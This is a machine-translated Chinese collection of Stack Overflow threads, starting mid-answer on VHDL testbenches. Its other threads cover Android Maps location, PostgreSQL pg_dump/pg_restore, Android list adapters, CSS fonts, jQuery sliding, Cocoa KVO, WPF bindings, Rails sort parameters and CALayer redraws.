要通过仿真测试系统，您将把顶层实体 (=FPGA) 嵌入到另一个没有外部端口的实体 - 测试平台中。相反，FPGA 的端口连接到测试台内的信号。这些信号连接到......其中一些连接到其他实体 - 可能是存储器模型或 SPI 从外设，因此您可以模拟 SPI 事务......其中一些由测试台中的进程驱动，该进程为您的 FPGA 刺激提供信号并检查其响应、检测和报告错误。

最佳实践涉及您创建的每个实体的测试台 - 换句话说，单元测试。SPI 主机可能会连接到其他人的 SPI 从机和测试进程，以启动 SPI 事务并检查正确的响应。这样，您可以在实体级别定位和纠正问题，而不是尝试从顶级测试平台诊断它们。

[此处](http://vhdlguru.blogspot.co.uk/2010/03/entity-instantiation-easy-way-of-port.html)显示了一个基本示例：

请注意，他通过位置关联和（稍后）命名关联来显示端口映射 - 您也可以将这两种形式用于函数参数，如在 Ada 中，但不能使用仅允许位置关联的 C。

“vhdlguru”没有说命名关联是首选，因为位置关联是混乱和错误的丰富来源。

这开始有帮助了吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-06-19T08:10:11.717

基本上有两种将信息传递给实体的可能性：

**在运行时**

实体使用端口语句中定义的信号相互通信。为了更好的可读性，我建议在适当的情况下使用 std_logic_vector、numeric_std 甚至更好的记录类型。请参阅下面的链接。

**在合成时**

如果您想在综合时将实体的参数设置为固定值（例如 fifo 的大小），您可能需要使用通用语句。另请参阅下面的链接。

我也可以推荐阅读这篇论文。在处理超过一定复杂性的系统时，它对我有很大帮助： [一种结构化的 VHDL 设计方法](http://www.gaisler.com/doc/structdesign.pdf)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-06-19T17:19:57.460

实体/组件与子程序（函数/过程）的一些简单概括。

当可重用代码块包含触发器（寄存器）时，使用实体。

使用函数做计算。对于 RTL 代码，我将函数用于小型、可重用的组合逻辑。

我主要使用测试平台的程序。我使用程序将单个事务（波形或接口操作）应用于我正在测试的设计。对于测试平台，我进一步使用过程来封装经常使用的事务序列。

# android - Android Maps Api V2 中是否有类似 onFirstFix 方法的功能？

> ID：13704154
> 
> 赞同：6
> 
> 时间：2012-12-04T13:34:44.487
> 
> 标签：android, google-maps, google-maps-android-api-2

[我可以通过setMyLocationEnabled](https://developers.google.com/maps/documentation/android/reference/com/google/android/gms/maps/GoogleMap#setMyLocationEnabled%28boolean%29)在新的 Maps Api 中启用 myLocation 视图。

Api 的第一个版本有一个方法[runOnFirstFix](https://developers.google.com/maps/documentation/android/v1/reference/)，它使我能够在找到位置后将地图动画化到用户位置。我在 Api 版本 2 中找不到类似的侦听器或位置。

找到用户后是否有解决方案来执行操作？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-06T21:00:05.620

Google Maps Android API V2 有一个 LocationSource。从文档：

“GoogleMap 对象的 my-location 层有一个内置的位置提供程序，但可以用另一个实现此接口的提供程序来替换它。”

[位置来源](https://developers.google.com/maps/documentation/android/reference/com/google/android/gms/maps/LocationSource)

我想您需要将它与[LocationSource.OnLocationChangedListener结合使用](https://developers.google.com/maps/documentation/android/reference/com/google/android/gms/maps/LocationSource.OnLocationChangedListener)

**更新**

弄清楚了。如果您想做类似于 runOnFirstFix 的操作，这里有一个基本示例，它等到用户的位置可用，然后将地图动画化为以他们的位置为中心。

```
public class MyLocationMapFragmentActivity extends FragmentActivity implements LocationListener, LocationSource
{
/**
 * Note that this may be null if the Google Play services APK is not available.
 */
private GoogleMap mMap;

private OnLocationChangedListener mListener;
private LocationManager locationManager;

private Context mContext;

@Override
protected void onCreate(Bundle savedInstanceState) 
{
    super.onCreate(savedInstanceState);

    setContentView(R.layout.basic_map);

    this.mContext = this;

    locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);

    //You may want to pass a different provider in as the first arg here
    //depending on the location accuracy that you desire
    //see LocationManager.getBestProvider()
    Criteria locationCriteria = new Criteria();
    locationCriteria.setAccuracy(Criteria.ACCURACY_FINE);
    locationManager.requestLocationUpdates(locationManager.getBestProvider(locationCriteria, true), 1L, 2F, this);

    setUpMapIfNeeded();
}

@Override
public void onPause()
{
    if(locationManager != null)
    {
        locationManager.removeUpdates(this);
    }

    super.onPause();
}

@Override
public void onResume()
{
    super.onResume();

    setUpMapIfNeeded();

    if(locationManager != null)
    {
        mMap.setMyLocationEnabled(true);
    }
}

/**
 * Sets up the map if it is possible to do so (i.e., the Google Play services APK is correctly
 * installed) and the map has not already been instantiated.. This will ensure that we only ever
 * call {@link #setUpMap()} once when {@link #mMap} is not null.
 * <p>
 * If it isn't installed {@link SupportMapFragment} (and
 * {@link com.google.android.gms.maps.MapView
 * MapView}) will show a prompt for the user to install/update the Google Play services APK on
 * their device.
 * <p>
 * A user can return to this Activity after following the prompt and correctly
 * installing/updating/enabling the Google Play services. Since the Activity may not have been
 * completely destroyed during this process (it is likely that it would only be stopped or
 * paused), {@link #onCreate(Bundle)} may not be called again so we should call this method in
 * {@link #onResume()} to guarantee that it will be called.
 */
private void setUpMapIfNeeded() {
    // Do a null check to confirm that we have not already instantiated the map.
    if (mMap == null) 
    {
        // Try to obtain the map from the SupportMapFragment.
        mMap = ((SupportMapFragment) getSupportFragmentManager().findFragmentById(R.id.basicMap)).getMap();
        // Check if we were successful in obtaining the map.

        //This is how you register the LocationSource
        mMap.setLocationSource(this);

        if (mMap != null) 
        {
            setUpMap();
        }
    }
}

/**
 * This is where we can add markers or lines, add listeners or move the camera. In this case, we
 * just add a marker near Africa.
 * <p>
 * This should only be called once and when we are sure that {@link #mMap} is not null.
 */
private void setUpMap() 
{
    mMap.setMyLocationEnabled(true);
}

@Override
public void activate(OnLocationChangedListener listener) 
{
    mListener = listener;
}

@Override
public void deactivate() 
{
    mListener = null;
}

@Override
public void onLocationChanged(Location location) 
{
    if( mListener != null )
    {
        mListener.onLocationChanged( location );

        //Move the camera to the user's location once it's available!
        mMap.animateCamera(CameraUpdateFactory.newLatLng(new LatLng(location.getLatitude(), location.getLongitude())));
    }
}

@Override
public void onProviderDisabled(String provider) 
{
    // TODO Auto-generated method stub
    Toast.makeText(this, "provider disabled", Toast.LENGTH_SHORT).show();
}

@Override
public void onProviderEnabled(String provider) 
{
    // TODO Auto-generated method stub
    Toast.makeText(this, "provider enabled", Toast.LENGTH_SHORT).show();
}

@Override
public void onStatusChanged(String provider, int status, Bundle extras) 
{
    // TODO Auto-generated method stub
    Toast.makeText(this, "status changed", Toast.LENGTH_SHORT).show();
}
} 
```

**更新 2**

如果您有兴趣在用户的位置离开屏幕时将地图置于用户位置的中心（就像旧 API 中的 MyLocationOverlay 一样），请参阅[此答案](https://stackoverflow.com/a/13753518/1103584)

或这篇博文：[Google Maps Android API V2 MyLocation LocationSource and event handling](http://discgolfsoftware.wordpress.com/2012/12/06/google-maps-android-api-v2-mylocation-locationsource-and-event-handling/)

# postgresql - 如何 pg_restore

> ID：13704160
> 
> 赞同：14
> 
> 时间：2012-12-04T13:35:03.660
> 
> 标签：postgresql, backup, restore

我通过命令行将我的数据库“mydatabase”转储到文本文件“mydatabase.sql”中。

```
"C:/Program Files (x86)/PostgreSQL/9.1/bin/pg_dump.exe " --host localhost --port 5432 --username "postgres" --no-password --verbose --file "C:\Users\User 1\Desktop\mydatabase.sql" "mydatabase" 
```

一切顺利。但是经过多次尝试后，我无法将这些文件与数据一起 pg_restore 回数据库。
但是，如果我删除此数据库中的所有表，我可以这样做：

```
psql -f "C:\Users\User 1\Desktop\mydatabase.sql" "mydatabase" "postgres" 
```

这恢复了所有数据。问题是我无法通过 VBNET/shell 运行 pgsl，所以我宁愿需要 pg_restore.exe 这是我的尝试：

```
"C:/Program Files (x86)/PostgreSQL/9.1/bin/pg_restore.exe " -i -h localhost -p 5432 -U postgres -d "mydatabase" -v "C:\Users\User 1\Desktop\mydatabase.sql" 
```

...我收到消息的地方：

> C:\Users\User 1>"C:/Program Files (x86)/PostgreSQL/9.1/bin/pg_restore.exe " -i -h localhost -p 5432 -U postgres -d "mydatabase" -v "C:\ Users\User 1\Desktop\mydatabase.sql" 无效二进制 "C:/Program Files (x86)/PostgreSQL/9.1/bin/pg_restore.exe " pg_restore.exe : [archiver] 输入文件似乎不是有效的存档

在尝试恢复之前，我在服务器上有空数据库“mydatabase”（没有表）。请任何帮助以使 pg_restore 与 pg_dump 转储的“mydatabase.sql”一起工作，并且显然包含正确的数据，因此我可以通过纯命令行或 VBNET/shell 使用它。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-12-04T13:44:05.443

在您的 pg_dump 中，指定`-F t`标志。这告诉 pg_dump 创建 tar 格式的备份，适合通过 pg_restore 进行恢复。

```
"C:/Program Files (x86)/PostgreSQL/9.1/bin/pg_dump.exe " --host localhost --port 5432 --username "postgres" --no-password --verbose -F t --file "C:\Users\User 1\Desktop\mydatabase.sql" "mydatabase" 
```

# java - 将自定义布局添加到列表视图行

> ID：13704163
> 
> 赞同：0
> 
> 时间：2012-12-04T13:35:15.503
> 
> 标签：java, android, android-layout

我已经尝试了一段时间，但我似乎仍然无法做到正确。我可以向列表视图添加自定义标题，但无法向列表添加自定义行布局。我希望列表中的每一行都具有文件“listitemrow.xml”的布局，但尽管阅读了多个教程，但我似乎不太明白如何做到这一点。

这是我的代码

```
public class PortfolioFragMent extends android.app.ListFragment{
    private String[] ShareholdingNames;
    private ListView mainListView ;
    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,Bundle savedInstanceState) {

        ListView listView = new ListView(getActivity());
        super.onCreate(savedInstanceState);

        ViewGroup header = (ViewGroup)inflater.inflate(R.layout.listviewheader, listView, false);
        listView.addHeaderView(header, null, false);

        ViewGroup listrow = (ViewGroup)inflater.inflate(R.layout.listitemrow, listView, false);
//listView.add(listitemrow); I want to do something like this

        ArrayAdapter<String> array = new ArrayAdapter<String>(getActivity(),
                android.R.layout.simple_list_item_1);
        setListAdapter(array);
        ShareholdingNames= ShareholdingNames();

        for (String str : ShareholdingNames)
            array.add(str);
        listView.setAdapter(array);
        return listView;
    }

    private String[] ShareholdingNames(){
        ShareholdingNames = new String[Portfolio.getPortfolio().count()];
        for(int i=0; i < Portfolio.getPortfolio().count(); i++){
            ShareholdingNames[i]= Portfolio.getPortfolio().getShareHolding(i).getName();
        }
        return ShareholdingNames;
    }

    public void onListItemClick(ListView l, View v, int position, long id) {
        Intent intent = new Intent(getActivity().getApplicationContext(),
        DetailShareHoldingActivity.class);
        intent.putExtra("new_variable_name","value");
        intent.putExtra("bookPositionInList",position);
        startActivity(intent);  
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-04T13:37:23.563

为此，您需要添加自己的自定义适配器并添加行

```
ViewGroup listrow = (ViewGroup)inflater.inflate(R.layout.listitemrow, listView, false); 
```

进入适配器的`getView`方法..

```
public class ListAdapter extends ArrayAdapter<Item> {

 public ListAdapter(Context context, int textViewResourceId) {
super(context, textViewResourceId);
// TODO Auto-generated constructor stub
}

private List<Item> items;

public ListAdapter(Context context, int resource, List<Item> items) {

super(context, resource, items);

this.items = items;

}

@Override
public View getView(int position, View convertView, ViewGroup parent) {

View v = convertView;

if (v == null) {

    LayoutInflater vi;
    vi = LayoutInflater.from(getContext());
    v = vi.inflate(R.layout.listitemrow, listView, false);

}

 ...
return v;

}
} 
```

# html - 使用较小的行高时，Web 字体可点击区域重叠

> ID：13704168
> 
> 赞同：2
> 
> 时间：2012-12-04T13:35:22.007
> 
> 标签：html, css, webfonts

我一直在尝试将 Neue Helvetica Thai Light webfont 用于垂直菜单。此菜单中的字母应该很大，但行与行之间的空间不是很大。所以我已经设置`font-size`并`line-height`在 css 和外观是完美的，但功能不是。

每个链接都在字母的上方和下方延伸，以便相邻项目的可点击区域重叠，从而防止用户点击他们点击的链接。使用 Arial、Verdana 等常用字体时，此问题不存在。

问题可能出在字体本身，但如何避免，有什么解决方法吗？我已将问题发送到 fonts.com - 提供字体但仍在等待答案的网站。

HTML：

```
<ul class="menu">
    <li><a href="1">Item 1</a></li>
    <li><a href="2">Item 2</a></li>
    <li><a href="3">Item 3</a></li>
</ul> 
```

CSS：

```
ul.menu a {
    font-family: 'HelveticaNeueW31-Light';
    font-size: 39px;
    line-height: 28px;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T16:24:39.800

在互联网上进一步（重新）搜索后，我偶然发现了[这篇文章](http://css-tricks.com/forums/discussion/4386/trouble-with-clickable-area-and-small-line-height/p1#Item_14)，并最终使用了所提供解决方案的略微修改版本。我不热衷于回答我自己的问题，但它可能对某人有帮助，因为这个问题并不常见，所以答案不容易找到。

诀窍是隐藏锚的溢出部分。由于锚点之类的内联元素忽略`overflow`属性锚显示改为`display: block`，然后设置`overflow: hidden`。然后调整`height`，使字母不被切断。使用字体中最低于基线的字母，因为底部应该首先被切断，因为使用了 Helvetica 小字母*g*。

```
ul.menu a {
    font-family: 'HelveticaNeueW31-Light';
    font-size: 39px;
    display: block;
    height: 47px;
    overflow: hidden;
} 
```

这是[解决](https://jsfiddle.net/jLjvo3jp/)方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:48:59.220

只是一个想法，但也许类似的东西 `font-height: 24px;`可能会有所帮助？

# javascript - 当 .slideUp() 和 slideDown() 不工作时 .slideToggle() 工作的原因可能是什么

> ID：13704173
> 
> 赞同：4
> 
> 时间：2012-12-04T13:35:35.593
> 
> 标签：javascript, jquery

**背景：**

我遇到了一个我觉得有点意外的问题。我有一个小的 jQuery 模块，我一直在用`.slideToggle()`它来显示/隐藏一个元素，它一直运行良好。今天我正在为我的插件实现两个公共方法，以显示或隐藏具有滑动效果的元素。

听起来很简单，但我只是使用`.slideUp()`and`slideDown()`来完成同样的事情。当我意识到在元素上调用这些方法时没有发生任何事情时，我真的很惊讶。

*作为旁注，调用`.show()`和`.hide()`工作也很好，但没有所需的动画偏离路线。*

我一直认为它实现了与“幕后”`.slideToggle()`相同的功能，但显然事实并非如此。`.slideUp()``.slideDown()`

**我的问题：**

与其他人相比，在使用其中一种方式时，有什么`.slideToggle()`不同，`.slideUp()`我`.slideDown()`必须考虑什么？

**更新，例如：**

我已经能够将它分解为在[这个小提琴](http://jsfiddle.net/3Krz5/2/)中重现这个错误所需的最关键的组件。您可以注释掉`.slideToggle("slow")`并`.slideUp("slow")`分别对其进行测试。使用 slideToggle 它可以工作，而使用 slideUp 它不能。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-04T14:30:35.987

问题是这`slideUp`不是该方法的最佳名称。一个更好的名字是“slideHide”。如果您将其更改`slideDown`为按预期工作，因为这对应于显示。

来自[http://api.jquery.com/slideUp/](http://api.jquery.com/slideUp/)

> 描述：通过滑动隐藏匹配的元素。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T14:32:38.693

它实际上以相同的方式工作。`slideDown`我相信您已经颠倒了调用和的顺序`slideUp`。这是一个更新的[小提琴](http://jsfiddle.net/3Krz5/4/)。

代码：

```
var flip = true;
$(".dockedHeader").on("click", function () {
    if (flip) {
        $(".content").slideDown("slow");
        flip = !flip;
    } else {
        $(".content").slideUp("slow");
        flip = !flip;
    }
    //$(".content").slideToggle("slow");
}); 
```

最初您的内容是隐藏的，因此您应该调用`sliderDown()`而不是`slideUp()`显示它，反之亦然。

# image - 当我通过浏览器查看时，图像显示较暗，但在我的笔记本电脑上仍然显示良好

> ID：13704174
> 
> 赞同：-1
> 
> 时间：2012-12-04T13:35:37.793
> 
> 标签：image, rendering, photoshop, jpeg

当我尝试加载一个网站时，它在我的桌面上显示如下：

[http://img846.imageshack.us/img846/9646/1354627721863.jpg](http://img846.imageshack.us/img846/9646/1354627721863.jpg)

现在通常它应该像我的笔记本电脑上显示的那样流畅：

[http://unforgivenwow.com/theknight/unforgivenwow/](http://unforgivenwow.com/theknight/unforgivenwow/)

有人知道吗？

NVM，修好了。显然windows使用了我的显示器他的颜色，所以我把它们改成了rgba。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-06T23:21:52.933

不同的显示器以不同的方式显示图像。如果只是图像颜色质量的问题，您的显示器可能无法处理所有颜色。如果是速度问题，则可能是您的计算机或互联网连接的问题。

# cocoa - 如何观察像“object.attribute”这样的关键路径

> ID：13704178
> 
> 赞同：3
> 
> 时间：2012-12-04T13:35:39.837
> 
> 标签：cocoa, avaudioplayer, key-value, addobserver

问候，我是可可初学者，这是我的第一篇文章：P

我正在尝试制作一个非常简单的节奏游戏但卡住了，这就是我得到的：

```
/**** TouchView.h/m ****/
@property AVAudioPlayer *audioPlayer; 
```

* * *

```
[self addObserver:self 
       forKeyPath:@"audioPlayer.currentTime" 
          options:(NSKeyValueObservingOptionNew | NSKeyValueObservingOptionOld)
          context:NULL]; 
```

* * *

```
//audioPlayer.currentTime's type is NSTimeinterval (double)

- (void)observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object change (NSDictionary *)change context:(void *)context
{
   NSLog(@"action triggered!")
} 
```

这不起作用（我已经正确初始化了audioPlayer，它可以播放声音但是当它的currentTime值发生变化时无法被捕获）

我用另一个属性 "double testNumber" 测试这些代码，将其设置为 "keyPath" 的参数，当我触摸屏幕时将其增加一，然后效果很好。但是我应该怎么做才能观察到 audioPlayer.currentTime ，我只想在这个值发生变化时得到通知，任何其他建议也将不胜感激。我指望你，请帮助我，谢谢:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:39:23.930

怎么样：

```
[audioPlayer addObserver:self
              forKeyPath:@"currentTime"
                 options:(NSKeyValueObservingOptionNew | NSKeyValueObservingOptionOld)
                 context:NULL]; 
```

但是，如果您真的想让**您的**对象符合 KVC（这是您尝试使用的），您需要遵循[Apple](http://developer.apple.com/library/ios/#documentation/cocoa/conceptual/KeyValueCoding/Articles/Compliant.html#//apple_ref/doc/uid/20002172-BAJEAIEE)关于该主题的指南：

> 为了让一个类被认为是对特定属性的 KVC 兼容，它必须实现 valueForKey: 和 setValue:forKey: 所需的方法才能为该属性工作。

# java - 用于 Java 的 Base8 API

> ID：13704180
> 
> 赞同：0
> 
> 时间：2012-12-04T13:35:44.660
> 
> 标签：java, octal

我想编码`byte[]`为**Base8** String ie) **0** to **7**。当然，Base64 是常用的，并且内存占用较少。但是，我需要进行 Base8 编码​​。是否有任何可用的 API 或者我必须自己编写？谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T13:40:01.823

如果您有多个字节，则不清楚 base 8 如何工作。我假设你想最小化消息的大小，这样你就可以做到

```
// print in base 8 (or octal)
String text = new BigInteger(1, bytes).toString(8); 
```

做相反的事情，你可以做

```
byte[] bytes = new BigInteger(text, 8).toByteArray();
if (bytes.length > 1 && bytes[0] == 0) {
    // remove the first byte
} 
```

# php - PHP更新后Codeigniter DX_Auth登录不起作用

> ID：13704184
> 
> 赞同：0
> 
> 时间：2012-12-04T13:35:47.903
> 
> 标签：php, codeigniter, authentication

我最近将 PHP 从 5.3.5 升级到 5.3.10。我正在为 Codeigniter 使用[DX_Auth](https://github.com/EllisLab/CodeIgniter/wiki/DX-Auth)身份验证库。现在我有以下问题：

*   更新后注册的用户无法登录
*   更新后更改密码的用户无法再登录

更新前创建账号的用户仍然可以登录。DX_Auth使用PHPs`crypt()`功能。

有什么想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-05T08:27:46.617

显然 DX_Auth 在 PHP 更新后生成更长的哈希值。增加数据库中密码字段的长度就可以了。

# wpf - StackPanel 通过转换器动态绑定 Visibility 和 IsEnabled 属性

> ID：13704186
> 
> 赞同：1
> 
> 时间：2012-12-04T13:35:54.613
> 
> 标签：wpf, dynamic, binding, properties, stackpanel

我的小目标是实现动态的动态生成控件并关联它们各自的属性，例如 Visibility 和 IsEnabled。

控件必须插入 StackPanel。并且基于某些条件，子节点的属性会发生变化。我使用了以下嵌套的 StackPanel 结构：

1.  具有子项垂直方向的父 StackPanel（标签和输入字段的集合以模拟表单）
2.  水平方向的子节点 StackPanel（标签和输入字段）

主要思想是每个标签只有一个输入字段：日期选择器、组合、文本或任何其他字段。结果，我创建了一个标签和一个带有多个控件的网格。我通过转换器操作输入控件的 Visibility 和 IsEnabled 属性。

问题是：是否有可能通过其他方式（更有效/更美观）来实现所有这些？非常欢迎建设性的批评和建议:)

先感谢您。

XAML：

```
<StackPanel Grid.Row="1" Orientation="Vertical">
    <ItemsControl ItemsSource="{Binding DataClass}">
        <ItemsControl.ItemTemplate>
            <DataTemplate>
                <StackPanel Orientation="Horizontal" Margin="0, 5, 0, 0" >
                    <Label Content="{Binding KeyName}" Width="150"/>
                    <Grid>
                        <Grid.ColumnDefinitions>
                            <ColumnDefinition Width="190"/>
                        </Grid.ColumnDefinitions>
                        <DatePicker Text="{Binding Value}"
                            Visibility="{Binding Type, Converter={StaticResource TypeVisiblity}, ConverterParameter='DateTime'}"
                            IsEnabled="{Binding RelativeSource={x:Static RelativeSource.Self}, Converter={StaticResource VisibilityEnabled}}"/>
                        <ComboBox Text="{Binding Value}" 
                            Visibility="{Binding Type, Converter={StaticResource TypeVisiblity}, ConverterParameter='Lookup'}"
                            IsEnabled="{Binding RelativeSource={x:Static RelativeSource.Self}, Converter={StaticResource VisibilityEnabled}}"/>
                        <TextBox Text="{Binding Value}" 
                            Visibility="{Binding Type, Converter={StaticResource TypeVisiblity}, ConverterParameter='Number'}"
                            IsEnabled="{Binding RelativeSource={x:Static RelativeSource.Self}, Converter={StaticResource VisibilityEnabled}}"/>
                        <TextBox Text="{Binding Value}" 
                            Visibility="{Binding Type, Converter={StaticResource TypeVisiblity}, ConverterParameter='Text'}"
                            IsEnabled="{Binding RelativeSource={x:Static RelativeSource.Self}, Converter={StaticResource VisibilityEnabled}}"/>
                    </Grid>
                </StackPanel>
            </DataTemplate>
        </ItemsControl.ItemTemplate>
    </ItemsControl>
</StackPanel> 
```

可见性转换器：

```
public object Convert(object value, Type targetType, object parameter, CultureInfo culture)
    {
        bool isMatched;
        string type,
               controlType;

        // Safe Convert.
        type = System.Convert.ToString(value);
        controlType = System.Convert.ToString(parameter);

        if (string.IsNullOrEmpty(type) || string.IsNullOrEmpty(controlType))
        {
            return Visibility.Hidden;
        }

        // Check matching.
        isMatched = string.Equals(type, controlType, StringComparison.CurrentCultureIgnoreCase);

        return isMatched ? Visibility.Visible : Visibility.Hidden;
    } 
```

IsEnabled 转换器：

```
public object Convert(object value, Type targetType, object parameter, CultureInfo culture)
{
    Control control;

    control = value as Control;

    if (control == null)
    {
        return false;
    }

    return control.Visibility == Visibility.Visible;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:56:56.037

创建一个用户控件，其中包含您的 DatePicker、ComboBox、TextBox 等作为用户界面，并在此用户控件后面的代码中实现所有必要的逻辑。您可以添加依赖属性来实现您的逻辑，而无需转换器。

您可以通过将用户控件添加到其 Children 属性中轻松地将其添加到 StackPanel。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T14:12:55.317

我会使用 a`ContentControl`并将其设置`ContentTemplate`为样式

```
<ContentControl>
    <ContentControl.Style>
        <Style TargetType="{x:Type ContentControl}">
            <!-- Default Template -->
            <Setter Property="ContentTemplate" 
                    Value="{DynamicResource TextBoxTemplate}" />

            <Style.Triggers>
                <DataTrigger Binding="{Binding Type}" Value="DateTime">
                    <Setter Property="ContentTemplate" 
                            Value="{DynamicResource DateTimeTemplate}" />
                </DataTrigger>
                <DataTrigger Binding="{Binding Type}" Value="Lookup">
                    <Setter Property="ContentTemplate" 
                              Value="{DynamicResource ComboBoxTemplate}" />
                </DataTrigger>
            </Style.Triggers>
        </Style>
    </ContentControl.Style>
</ContentControl> 
```

# ruby-on-rails - 将“.order(params[])”与实例方法一起使用？

> ID：13704187
> 
> 赞同：1
> 
> 时间：2012-12-04T13:35:56.950
> 
> 标签：ruby-on-rails

我有一个`Post`,`Reply`和一个`Vote`模型（多态）：

```
 create_table "posts", :force => true do |t|
    t.text     "content",       :limit => 255
    t.integer  "user_id"
    t.datetime "created_at",                                  :null => false
    t.datetime "updated_at",                                  :null => false
    t.string   "title"
    t.integer  "replies_count",                :default => 0, :null => false
    t.integer  "category_id"
  end

  create_table "replies", :force => true do |t|
    t.text     "content"
    t.integer  "post_id"
    t.integer  "user_id"
    t.datetime "created_at", :null => false
    t.datetime "updated_at", :null => false
  end

  create_table "votes", :force => true do |t|
    t.integer  "votable_id"
    t.string   "votable_type"
    t.integer  "user_id"
    t.integer  "polarity"
    t.datetime "created_at",   :null => false
    t.datetime "updated_at",   :null => false
  end 
```

我需要`total_votes`帖子和回复，所以我创建了一个实例方法：

**post.rb 和 reply.rb：**

```
 def total_votes
    self.votes.map {|v| v.polarity }.sum
  end 
```

所以我可以用它来对帖子和回复进行排序：

**主页：**

```
 default_order = "created_at DESC"
 params[:order_by] ||= default_order
 @feed_items = @post.replies.paginate(page: params[:page],
                                      per_page: 10).order(params[:order_by]) 
```

所以现在，我不太确定`order_by`在视图中添加了什么：

```
 <span><%= link_to 'total_votes DESC', root_path(order_by: HERE) %></span> 
```

我试过`&:total_votes DESC`但`total_votes DESC`没有奏效。

这样做的正确方法是什么？（我认为向和表中添加`total_votes`列有点不必要，但不确定这是否对性能更好？）`posts``replies`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T13:56:21.860

我将从使用数据库为您求和开始，但这有点棘手，因为您需要按计算的值（“聚合”）进行排序，但让我们把它放在一边。

*您的视图将按照在控制器*中设置实例变量时确定的顺序显示项目。所以在控制器中，您可能会检测到有一个`order_by`参数（例如`/feed?order_by=total_votes`，并相应地加载`@feed_items`，例如

```
def index
  if params[:order_by] && params[:order_by] == 'total_votes'
    sort_order = "total_votes DESC"
  else
    sort_order = "created_at DESC"
  end
  @feed_items = @post.replies.paginate(page: params[:page],
                                  per_page: 10).order(sort_order)
end 
```

然后在您看来，要*更改*排序顺序，请创建一个`link_to`添加查询字符串参数的函数（请参见[link_to api 文档](http://api.rubyonrails.org/classes/ActionView/Helpers/UrlHelper.html#method-i-link_to)中的最后一个示例，例如

```
<%= link_to "Sort by Total Votes", root_path(:order_by => 'total_votes') %><br />
<%= link_to "Sort by Time", root_path %><br /> 
```

您的另一个问题是关于如何按投票进行排序。这个答案可能会为此提供一个良好的开端，并回答您的性能问题：[Rails: Order by sum of two columns](https://stackoverflow.com/questions/7116772/rails-order-by-sum-of-two-columns)

# java - 如何从已部署的 Web 应用程序访问本地文件系统上的文件？

> ID：13704189
> 
> 赞同：0
> 
> 时间：2012-12-04T13:35:58.403
> 
> 标签：java, windows, tomcat

我在 Windows 7 上的 Tomcat 上部署了一个 Web 应用程序。我在 PC、本地文件系统上有各种文件，我想从我的 Web 应用程序访问这些文件。我该怎么做或者这可能吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T15:33:01.670

好的，看起来我找到了解决方案。

可以只使用具有绝对路径的 File() 对象就可以了。

我以为网络应用程序会有一些特殊要求，但看起来没有

# html - CSS字体速记？

> ID：13704192
> 
> 赞同：1
> 
> 时间：2012-12-04T13:36:13.130
> 
> 标签：html, css, fonts

我基本上是想通过使用速记属性将“font-style”缩写为“font”。但是，如果我在同一个选择器上也指定其他属性（大小/行高/字体系列），它似乎才有效。

如果我注释掉任何其他规范，“斜体”将被忽略！我在这里遗漏了什么还是我不应该使用

```
.main{font:italic;} 
```

而不是（例如）

```
.main{font-style:italic;} 
```

或者

```
.main{
font:italic 1em/1.2em georgia,"times new roman",serif;} 
```

那么，使用字体速记的最低要求是什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-04T13:38:17.297

[font-family](http://reference.sitepoint.com/css/font-family)和[font-size](http://reference.sitepoint.com/css/font-size)是此样式属性所需的最小样式。

**例子：**

```
font: 1em "Times New Roman", Times, serif; 
```

完整速记的示例如下：

```
font: bold italic small-caps 1em/1.5em verdana,sans-serif 
```

这将替换下面的原始代码：

```
font-weight: bold;
font-style: italic;
font-variant: small-caps;
font-size: 1em;
line-height: 1.5em;
font-family: verdana,sans-serif 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-04T13:42:13.383

最小规格是大小和字体名称。在您的情况下，它将如下所示：

```
.main{
 font: 1em  verdana;
} 
```

# objective-c - CALayer setNeedsDisplay 不能用？

> ID：13704198
> 
> 赞同：1
> 
> 时间：2012-12-04T13:36:42.740
> 
> 标签：objective-c, cocoa, calayer, nsnotificationcenter, setneedsdisplay

我的类是一个`CALayer`子类，我通过添加了一个观察者`NSNotificationCenter`，当捕捉到消息时，它将运行如下函数：

```
- (void)setCurrentAutoValue:(NSNotification *) obj
{

     [self setNeedsDiaplay];
} 
```

但这不起作用，有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T23:43:37.440

显然，有必要在主线程上调用 setNeedsDisplay。您可以使用该`performSelectorOnMainThread`方法执行此操作。例如在你的情况下：

```
[self performSelectorOnMainThread:@selector(setNeedsDisplay) withObject:0 waitUntilDone:NO]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-13T13:46:05.743

我通过另一个线程更新我的 CALayers 时遇到了同样的问题。如果我直接在同一个线程中调用以下任何行，它就会完美地工作：

```
 [self setNeedsDisplay:YES];
              [self needsDisplay];
              [self.circleLayer needsDisplay];
              [self.circleLayer setNeedsDisplay]; 
```

但是当通过另一个线程调用这些时，没有任何变化。我玩了一会儿，最后使用了

```
 [self display]; 
```

这是唯一迫使 CALayers 更新的事情。Self 是一个 NSOpenGLView ，它包含几个层和子层。也许这会有所帮助。每个 CALayer 都有相同的可用方法。也许你应该调用显示。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-07-17T09:06:40.953

